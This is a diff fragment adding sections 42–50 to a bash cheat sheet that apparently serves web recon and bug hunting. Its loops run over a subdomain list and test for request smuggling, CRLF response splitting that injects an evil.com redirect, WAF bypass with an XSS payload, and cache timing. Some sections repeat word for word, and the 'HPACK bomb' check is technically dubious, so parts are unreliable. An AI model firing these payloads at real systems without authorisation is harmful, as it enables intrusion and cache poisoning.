+        status=$(curl -s -o /dev/null -w "%{http_code}" "$full_link")
+        if [ "$status" == "404" ]; then
+            echo "🔗 Broken link on $url: $full_link (404)"
+        elif [ "$status" == "500" ]; then
+            echo "🔗 Server error on $url: $full_link (500)"
+        fi
+    done
+done
+```
+
+## 42. **HTTP Request Smuggling via WebSocket Upgrade**
+```bash
+# Test for request smuggling via WebSocket upgrade
+cat subdomains.txt | httpx -silent -websocket | while read url; do
+    # Create smuggled request
+    payload="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+    
+    response=$(curl -s -i -k -H "Connection: Upgrade, HTTP2-Settings" \
+        -H "Upgrade: h2c" \
+        -H "HTTP2-Settings: $payload" \
+        "$url")
+    
+    if echo "$response" | grep -q "200 OK\|Admin"; then
+        echo "🚨 WebSocket upgrade smuggling at $url"
+    fi
+done
+```
+
+## 43. **Cache Timing Side-Channel Analysis**
+```bash
+# Detect cache timing side-channels
+cat subdomains.txt | httpx -silent | while read url; do
+    # First request - should miss cache
+    time1=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
+    
+    sleep 1
+    
+    # Second request - might hit cache
+    time2=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
+    
+    # Calculate difference
+    diff=$(echo "$time1 - $time2" | bc)
+    
+    if (( $(echo "$diff > 0.1" | bc -l) )); then
+        echo "⏱️ Cache timing difference at $url/sensitive: ${diff}s"
+        
+        # Test if we can use this to detect existence
+        time_exists=$time2
+        
+        # Test non-existent resource
+        time_missing=$(curl -s -o /dev/null -w "%{time_total}" "$url/nonexistent123")
+        
+        diff_exists=$(echo "$time_exists - $time_missing" | bc)
+        if (( $(echo "$diff_exists > 0.1" | bc -l) )); then
+            echo "  ✅ Can detect existence of sensitive resources via timing"
+        fi
+    fi
+done
+```
+
+## 44. **HTTP Response Splitting Detection**
+```bash
+# Find HTTP response splitting vulnerabilities
+cat subdomains.txt | httpx -silent | while read url; do
+    # Inject CRLF in parameter
+    response=$(curl -s -i -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a")
+    
+    if echo "$response" | grep -q "evil.com"; then
+        echo "🚨 HTTP Response Splitting at $url"
+        
+        # Test for cache poisoning
+        cache_response=$(curl -s -I -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a" | grep -i "x-cache:")
+        if echo "$cache_response" | grep -q "HIT"; then
+            echo "  ⚠️ Cache poisoning possible"
+        fi
+    fi
+done
+```
+
+## 45. **Web Application Firewall (WAF) Fingerprinting**
+```bash
+# Fingerprint WAF solutions
+cat subdomains.txt | httpx -silent | while read url; do
+    # Send malicious payload to trigger WAF
+    response=$(curl -s -i -k "$url?q=<script>alert(1)</script>")
+    
+    # Check for WAF signatures
+    if echo "$response" | grep -q "cloudflare\|cf-ray"; then
+        echo "🛡️ Cloudflare detected on $url"
+    elif echo "$response" | grep -q "akamai\|akamaighost"; then
+        echo "🛡️ Akamai detected on $url"
+    elif echo "$response" | grep -q "incapsula\|X-Iinfo"; then
+        echo "🛡️ Incapsula detected on $url"
+    elif echo "$response" | grep -q "f5\|BIG-IP"; then
+        echo "🛡️ F5 BIG-IP detected on $url"
+    elif [ "$(echo "$response" | head -1 | cut -d' ' -f2)" == "406" ]; then
+        echo "🛡️ WAF blocking (406) on $url - possible ModSecurity"
+    fi
+    
+    # Test WAF bypass techniques
+    bypass_payload="<scr<script>ipt>alert(1)</scr</script>ipt>"
+    bypass_response=$(curl -s -o /dev/null -w "%{http_code}" -k "$url?q=$bypass_payload")
+    
+    if [ "$bypass_response" == "200" ]; then
+        echo "  ⚠️ WAF bypass possible with obfuscation"
+    fi
+done
+```
+
+## 46. **HTTP/2 HPACK Bomb Detection**
+```bash
+# Check for HPACK bomb vulnerability (CVE-2021-3277)
+cat subdomains.txt | httpx -silent -http2 | while read url; do
+    # Create HPACK bomb payload
+    bomb_header="x-test: $(python3 -c "print('A'*10000)")"
+    
+    response=$(curl -s -i -k --http2 -H "$bomb_header" -w "%{size_header}" "$url")
+    
+    if [ $? -eq 0 ]; then
+        header_size=$(echo "$response" | wc -c)
+        if [ $header_size -gt 1000000 ]; then
+            echo "💣 HPACK bomb vulnerability at $url (header size: $header_size)"
+        fi
+    fi
+done
+```
+
+## 47. **Open Graph Protocol Scraping for OSINT**
+```bash
+# Extract Open Graph metadata for OSINT
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E '<meta property="og:[^"]+" content="[^"]+"' -o | 
+    while read og_tag; do
+        property=$(echo "$og_tag" | sed 's/.*property="og:\([^"]*\).*/\1/')
+        content=$(echo "$og_tag" | sed 's/.*content="\([^"]*\).*/\1/')
+        
+        case $property in
+            "title")
+                echo "$url: Page title: $content" >> osint_data.txt
+                ;;
+            "description")
+                echo "$url: Description: $content" >> osint_data.txt
+                ;;
+            "image")
+                echo "$url: Image: $content" >> osint_data.txt
+                # Download image for analysis
+                curl -s "$content" -o "images/$(basename $content)"
+                ;;
+            "email")
+                echo "📧 Email found: $content at $url" >> osint_data.txt
+                ;;
+        esac
+    done
+    
+    # Extract additional metadata
+    curl -s "$url" | grep -E '<meta name="twitter:[^"]+" content="[^"]+"' -o >> osint_data.txt
+done
+```
+
+## 48. **HTTP/3 Early Adoption Detection**
+```bash
+# Identify early adopters of HTTP/3
+cat subdomains.txt | httpx -silent -http3 -json | jq -r 'select(.["http3"]) | .url' |
+while read url; do
+    echo "🚀 HTTP/3 enabled: $url"
+    
+    # Get HTTP/3 implementation details
+    alt_svc=$(curl -s -I --http3 "$url" 2>/dev/null | grep -i "alt-svc")
+    if [ ! -z "$alt_svc" ]; then
+        echo "  ALTSVC: $alt_svc"
+        
+        # Check for QUIC version
+        if echo "$alt_svc" | grep -q "h3-29\|h3-30\|h3-31"; then
+            echo "  Using bleeding-edge HTTP/3 draft"
+        fi
+    fi
+done
+```
+
+## 49. **Broken Link Detection for SEO**
+```bash
+# Find broken links for SEO optimization
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E 'href="([^"]+)"' -o | sed 's/href="//; s/"//' | 
+    while read link; do
+        # Normalize link
+        if [[ "$link" == http* ]]; then
+            full_link="$link"
+        elif [[ "$link" == /* ]]; then
+            full_link="${url}${link}"
+        else
+            full_link="${url}/${link}"
+        fi
+        
+        # Check if link is broken
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$full_link")
+        if [ "$status" == "404" ]; then
+            echo "🔗 Broken link on $url: $full_link (404)"
+        elif [ "$status" == "500" ]; then
+            echo "🔗 Server error on $url: $full_link (500)"
+        fi
+    done
+done
+```
+
+## 50. **HTTP Request Smuggling via WebSocket Upgrade**
+```bash
+# Test for request smuggling via WebSocket upgrade
+cat subdomains.txt | httpx -silent -websocket | while read url; do
+    # Create smuggled request
+    payload="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+    
+    response=$(curl -s -i -k -H "Connection: Upgrade, HTTP2-Settings" \
+        -H "Upgrade: h2c" \
+        -H "HTTP2-Settings: $payload" \
+        "$url")
+    
+    if echo "$response" | grep -q "200 OK\|Admin"; then
+        echo "🚨 WebSocket upgrade smuggling at $url"
+    fi
+done
+```
 
